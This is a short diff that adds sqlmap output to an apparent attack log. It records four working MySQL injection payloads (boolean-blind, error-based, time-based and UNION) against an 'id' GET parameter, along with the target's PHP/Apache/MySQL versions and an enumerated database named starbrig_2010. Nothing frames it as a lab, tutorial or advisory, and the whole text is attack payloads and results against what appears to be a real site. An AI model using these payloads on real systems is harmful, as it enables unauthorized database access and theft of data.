@@ -73,3 +73,28 @@ available databases [2]:
 [*] information_schema
 [*] starbrig_2010
 
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: id=346 RLIKE (SELECT (CASE WHEN (2713=2713) THEN 346 ELSE 0x28 END))&rct=j&q=&esrc=s
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=346 AND (SELECT 8190 FROM(SELECT COUNT(*),CONCAT(0x7178767171,(SELECT (ELT(8190=8190,1))),0x71787a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&rct=j&q=&esrc=s
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=346 AND SLEEP(5)&rct=j&q=&esrc=s
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 1 column
+    Payload: id=-3932 UNION ALL SELECT CONCAT(0x7178767171,0x645964555874554669415264626f434879794467666c43536b65714d67475364516c415850624268,0x71787a7071)#&rct=j&q=&esrc=s
+---
+web application technology: PHP 5.3.28, Apache 2.2.26
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] information_schema
+[*] starbrig_2010
+
